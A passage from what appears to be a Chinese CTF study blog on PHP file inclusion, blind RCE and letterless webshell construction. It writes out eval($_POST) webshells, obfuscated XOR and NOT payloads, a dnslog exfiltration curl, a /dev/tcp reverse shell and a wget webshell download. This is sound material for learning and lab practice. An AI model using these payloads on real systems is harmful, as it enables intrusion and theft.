World!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">    http:<span class="comment">//2c421d36-abcf-46cb-9985-dc13ad0966a4.node4.buuoj.cn:81/?url=data:text/plain,&#x27;&lt;?php @eval($_POST[&#x27;capt&#x27;])?&gt;&#x27;&amp;filename=upload/test.php</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>data://</code>结合<code>SSRF</code>，绕过<code>GET</code>命令</strong></li>
</ul>
<p>​	<code>GET</code> 是一个命令行工具，通常用于从网络上获取资源。它类似于 <code>curl</code>或 <code>wget</code>，例如，<code>GET http://example.com</code> 会从 <code>http://example.com</code> 获取内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">--- ?url=data:text/plain,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;sh&quot;])?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(exp.php, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>这样就成功的将木马写入文件中，并使其起作用。</p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h4><p>​	当请求方式是<code>POST</code>的，并且**<code>enctpy</code>不等于<code>multipart/form-data</code>**时，可以使用<code>php://input</code>来获取原始请求的数据。如下会将通过<code>POST</code>方式提交的数据直接赋值给<code>$body</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);    <span class="comment">//变量body利用php://input伪协议获取post数据</span></span><br></pre></td></tr></table></figure>

<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><code>file_get_contents()</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>])===<span class="string">&quot;today is a happy day&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	<code>hackbar</code>直接传入<code>?2333=data://text/plain,today is a happy day&amp;file=flag</code>即可，如用<code>bp</code>则参数中的空格要<code>url</code>编码</p>
<p>​	本来在网上看<code>php://input</code>也行的（在<code>enctype</code>不为<code>multipart/from-data</code>的前提下），但试了好久，都没成功，发现是传入的<code>POST</code>内容需要变量名，但是给了变量名又会把**变量名&#x3D;<strong>也带上，而且里面的空格都用</strong>+**替代了。看其他师傅的文章中都没出现过这个问题，真的好奇怪😤</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>无回显RCE</title>
    <url>/2025/03/03/%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
    <content><![CDATA[<h2 id="什么是无回显RCE？"><a href="#什么是无回显RCE？" class="headerlink" title="什么是无回显RCE？"></a>什么是无回显RCE？</h2><p>无回显RCE，简单来说就是没有任何回显，不管命令或代码是否执行成功。这样的命令执行函数有exec()、shell_exec()。</p>
<h2 id="判断是否执行成功"><a href="#判断是否执行成功" class="headerlink" title="判断是否执行成功"></a>判断是否执行成功</h2><ol>
<li><p>延时：</p>
<span id="more"></span>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">windows</span>：whoami&amp;&amp;ping -n <span class="number">5</span> <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Linux</span>：whoami&amp;&amp;sleep <span class="number">5</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>目标服务器向个人的公网服务器<strong>发起http请求</strong>，当该公网服务器收到http请求就代表命令有执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">6666</span></span><br><span class="line"><span class="attribute">curl</span> 公网服务器IP:端口号</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="tee命令"><a href="#tee命令" class="headerlink" title="tee命令"></a>tee命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">tee</span> a <span class="comment">#将ls的结果输入文件a中</span></span><br></pre></td></tr></table></figure>

<h3 id="dnslog-cn外带"><a href="#dnslog-cn外带" class="headerlink" title="dnslog.cn外带"></a><a href="http://www.dnslog.cn/">dnslog.cn</a>外带</h3><ol>
<li>适用Linux</li>
<li>命令用反引号包裹</li>
<li>命令中不能有空格</li>
</ol>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl `<span class="built_in">whoami</span>`.lc52y4.dnslog.cn</span><br><span class="line">curl `<span class="built_in">cat</span> flag|sed s/[[:space:]]//`.lc52y4.dnslog.cn</span><br></pre></td></tr></table></figure>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/服务器IP/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="直接写入或外部下载webshell"><a href="#直接写入或外部下载webshell" class="headerlink" title="直接写入或外部下载webshell"></a>直接写入或外部下载webshell</h3><ol>
<li><p>直接写入，需要站点目录具有写权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span> &gt; exp.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>外部下载，目标服务器可以连接外网且与攻击机互通：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">wget 攻击机IP <span class="punctuation">-</span>o <span class="built_in">exp</span>.php</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="各种命令执行"><a href="#各种命令执行" class="headerlink" title="各种命令执行"></a>各种命令执行</h3><p><strong>前提：目标服务器上要有已知可读文件，站点目录具有写权限</strong></p>
<p>通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容。</p>
<ol>
<li><p>cp和mv和重定向</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>tar和zip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php  <span class="comment"># 打包flag.php为flag.tar</span></span><br><span class="line">tar zcvf flag.tar.gz flag.php  <span class="comment"># 压缩flag.php为flag.tar.gz</span></span><br><span class="line"><span class="comment"># 解压缩：tar zxvf flag.tar.gz</span></span><br><span class="line">zip flag.zip flag.php</span><br><span class="line"><span class="comment">#解压缩：unzip flag.zip</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/kinyoobi/p/15415869.html">无回显的渗透技巧 - kinyoobi - 博客园</a></p>
<p><a href="https://www.cnblogs.com/pursue-security/p/15406672.html">RCE篇之无回显rce - 学安全的小白 - 博客园</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>无数字字母RCE</title>
    <url>/2025/02/06/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
    <content><![CDATA[<p>无数字字母RCE就是不利用数字和字母，构造<code>webshell</code>来执行命令。常见的利用方法有异或、取反这两种，此外还有或、自增和临时文件。</p>
<span id="more"></span>

<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>​	在php中，两个字符进行异或时，会先将字符分别转换成ascii码值，再将这个值转换成二进制，然后将两个二进制值进行按位异或。按位异或的规则：<code>1^1=0,0^0=0,1^0=1</code></p>
<p>以<code>@</code>和<code>!</code>异或得<code>a</code>为例，下面是三种不同的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"><span class="comment">// echo urlencode(&#x27;@!&#x27;);  #%40%21，%后面的是十六进制</span></span><br><span class="line"><span class="comment">// echo hexdec(&quot;40&quot;)^hexdec(&quot;21&quot;);   #得到97，a的ascii码十进制表示</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="number">97</span>);</span><br><span class="line"><span class="comment">// echo hexdec(&quot;40&quot;).&#x27;,&#x27;.hexdec(&quot;21&quot;);   #64,33是40,21的十进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="number">64</span>^<span class="number">33</span>);</span><br></pre></td></tr></table></figure>

<p>通过构造<code>$_GET[]</code>传入新的参数，执行<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[code]);</span><br><span class="line"><span class="comment"># ?code=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span></span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finds</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$index</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="variable">$a</span>=[<span class="number">33</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">128</span>,<span class="number">129</span>,<span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">144</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,<span class="number">160</span>,<span class="number">161</span>,<span class="number">162</span>,<span class="number">163</span>,<span class="number">164</span>,<span class="number">165</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">168</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">171</span>,<span class="number">172</span>,<span class="number">173</span>,<span class="number">174</span>,<span class="number">175</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,<span class="number">190</span>,<span class="number">191</span>,<span class="number">192</span>,<span class="number">193</span>,<span class="number">194</span>,<span class="number">195</span>,<span class="number">196</span>,<span class="number">197</span>,<span class="number">198</span>,<span class="number">199</span>,<span class="number">200</span>,<span class="number">201</span>,<span class="number">202</span>,<span class="number">203</span>,<span class="number">204</span>,<span class="number">205</span>,<span class="number">206</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">209</span>,<span class="number">210</span>,<span class="number">211</span>,<span class="number">212</span>,<span class="number">213</span>,<span class="number">214</span>,<span class="number">215</span>,<span class="number">216</span>,<span class="number">217</span>,<span class="number">218</span>,<span class="number">219</span>,<span class="number">220</span>,<span class="number">221</span>,<span class="number">222</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">225</span>,<span class="number">226</span>,<span class="number">227</span>,<span class="number">228</span>,<span class="number">229</span>,<span class="number">230</span>,<span class="number">231</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">234</span>,<span class="number">235</span>,<span class="number">236</span>,<span class="number">237</span>,<span class="number">238</span>,<span class="number">239</span>,<span class="number">240</span>,<span class="number">241</span>,<span class="number">242</span>,<span class="number">243</span>,<span class="number">244</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">247</span>,<span class="number">248</span>,<span class="number">249</span>,<span class="number">250</span>,<span class="number">251</span>,<span class="number">252</span>,<span class="number">253</span>,<span class="number">254</span>,<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">27</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">27</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">			<span class="variable">$x</span> = <span class="variable">$a</span>[<span class="variable">$i</span>] ^ <span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">			<span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$string</span>[<span class="variable">$k</span>]) == <span class="variable">$x</span>)&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="variable">$string</span>[<span class="variable">$k</span>].<span class="string">&quot;:&quot;</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&#x27;%&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]) . <span class="string">&#x27;^%&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$a</span>[<span class="variable">$j</span>]).<span class="string">&quot;   &quot;</span>;</span><br><span class="line">					<span class="variable">$index</span>++;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$index</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;     <span class="comment">#dechex将十进制转换为十六进制</span></span><br><span class="line">&#125;         <span class="comment">#hexdec将十六进制转换为十进制</span></span><br><span class="line"><span class="title function_ invoke__">finds</span>(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>原理：按位异或相同为0不同为1，任意字符与<code>%ff</code>异或两次得任意字符。</p>
<p>先看下面这个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;print_r&#x27;</span> ^ <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line"><span class="comment">//$a 为 %8F%8D%96%91%8B%A0%8D</span></span><br><span class="line"><span class="comment">#输出:print_r</span></span><br></pre></td></tr></table></figure>

<p>构造<code>print_r(scandir(.));</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//%8F%8D%96%91%8B%A0%8D^%ff%ff%ff%ff%ff%ff%ff  #print_r</span></span><br><span class="line"><span class="comment">//%8C%9C%9E%91%9B%96%8D^%ff%ff%ff%ff%ff%ff%ff(%D1^%ff)  #scandir(.)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(.));</span><br><span class="line"><span class="comment">//((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));</span></span><br></pre></td></tr></table></figure>

<p>构造<code>readfile(end(scandir(.)));</code>：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">((<span class="variable">%8</span>D<span class="variable">%9</span>A<span class="variable">%9</span>E<span class="variable">%9</span>B<span class="variable">%99</span><span class="variable">%96</span><span class="variable">%93</span><span class="variable">%9</span>A)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))(((<span class="variable">%9</span>A<span class="variable">%91</span><span class="variable">%9</span>B)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))((<span class="variable">%8</span>C<span class="variable">%9</span>C<span class="variable">%9</span>E<span class="variable">%91</span><span class="variable">%9</span>B<span class="variable">%96</span><span class="variable">%8</span>D)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))(<span class="variable">%D1</span>^<span class="variable">%ff</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>有时候可能会限制字符的种类个数，我们就需要在原有的字符里再相互异或出需要的字符，需要一个一个找哪些字符可以由哪些字符异或得出。</p>
<p>例如<code>a = c^p^r</code>，为什么要三个字符异或两次而不是两个字符异或一次呢，因为要保证其他的字符不变，需要与<code>%ff</code>异或两次。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Find</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>]^<span class="variable">$a</span>[<span class="variable">$k</span>])==<span class="variable">$c</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$j</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$k</span>].<span class="string">&#x27;=&#x27;</span>.<span class="variable">$c</span>.<span class="string">&#x27;   &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;eadilnscipt&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">Find</span>(<span class="variable">$str</span>,<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<p>现在要将<code>((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))</code>减少字符种类，其实我们是要<strong>对<code>%8F%8D%96%91%8B%A0%8D</code>进行多次异或使之不变</strong>，已知<code>n = i^s^t</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;n&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;i&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;s&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;t&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="comment">#输出:%91 %96 %8C %8B</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%96&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%8c&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%8b&quot;</span>));</span><br><span class="line"><span class="comment">#输出:%91</span></span><br></pre></td></tr></table></figure>

<p>故有如下结论：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="variable">%8</span>F<span class="variable">%8</span>D<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%8</span>B<span class="variable">%A0</span><span class="variable">%8</span>D <span class="operator">=</span> (<span class="variable">%8</span>F<span class="variable">%8</span>D<span class="variable">%96</span><span class="variable">%96</span><span class="variable">%8</span>B<span class="variable">%A0</span><span class="variable">%8</span>D)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%8</span><span class="keyword">c</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%8</span>b<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>)</span><br></pre></td></tr></table></figure>

<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>因为取反后的结果有不可见字符，故需对其进行<code>url</code>编码，而<code>_GET</code>传参会对<code>url</code>编码的内容进行解码。</p>
<h3 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h3><p>对<code>_POST</code>进行取反并<code>url</code>编码，在解码取反得到。由于这部分要与<code>assert()</code>一起利用，故<code>(eval($_POST[_]))</code>这里外层加上了括号。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;_POST&#x27;</span>);   <span class="comment">#%A0%AF%B0%AC%AB</span></span><br><span class="line"><span class="keyword">echo</span> ~<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%A0%AF%B0%AC%AB&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%D7%<span class="number">93</span>%<span class="number">8</span>C%D6);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>构造<code>eval($_POST[_]);</code></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># assert  %9E%8C%8C%9A%8D%8B</span><br><span class="line"># (<span class="keyword">eval</span>($_POST[_]))  %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6</span><br><span class="line"># (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6);</span><br><span class="line">#即 (assert)((<span class="keyword">eval</span>($_POST[_])));</span><br></pre></td></tr></table></figure>

<p>构造<code>phpinfo();</code></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"># phpinfo  <span class="variable">%8</span>F<span class="variable">%97</span><span class="variable">%8</span>F<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%99</span><span class="variable">%90</span></span><br><span class="line"># (~<span class="variable">%8</span>F<span class="variable">%97</span><span class="variable">%8</span>F<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%99</span><span class="variable">%90</span>)()<span class="comment">;   #即为 phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>另一种方式构造<code>system($_POST[_])</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~(%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>);   <span class="comment">#定义变量$_为system</span></span><br><span class="line"><span class="variable">$__</span> = ~(%A0%AF%B0%AC%AB);  <span class="comment">#定义变量$__为_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">#定义变量$___为$$__，即为$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">#即为 assert($_POST[_]);</span></span><br><span class="line"><span class="comment">#将取反结果代入</span></span><br><span class="line"><span class="comment"># $_ = ~(%8C%86%8C%8B%9A%92);$__ = ~(%A0%AF%B0%AC%AB);$___ = $$__;$_($___[_]);</span></span><br></pre></td></tr></table></figure>

<h3 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h3><p>这种方法是利用汉字取反构造。</p>
<p>可以通过对<code>&#39;构&#39;&#123;1&#125;</code>进行取反，来构造字符<code>a</code>，而<code>1</code>可以通过<code>&#39;_&#39;==&#39;_&#39;</code>来获得。<code>&#39;_&#39;==&#39;_&#39;</code>结果为真，故返回<code>1</code>，反之<code>&#39;_&#39;==&#39;__&#39;</code>结果为假，返回<code>0</code>。</p>
<p>构造<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~可[<span class="variable">$_</span>].~时[<span class="variable">$_</span>].~可[<span class="variable">$_</span>].~新[<span class="variable">$_</span>].~周[<span class="variable">$_</span>].~白[<span class="variable">$_</span>].~向[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>();</span><br></pre></td></tr></table></figure>

<p>构造<code>system($_POST[_]);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~北[<span class="variable">$_</span>].~冲[<span class="variable">$_</span>].~北[<span class="variable">$_</span>].~苏[<span class="variable">$_</span>].~皇[<span class="variable">$_</span>].~和[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$___</span>=~码[<span class="variable">$_</span>].~寸[<span class="variable">$_</span>].~小[<span class="variable">$_</span>].~欠[<span class="variable">$_</span>].~立[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>(<span class="variable">$$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>寻找对应汉字的脚本：</p>
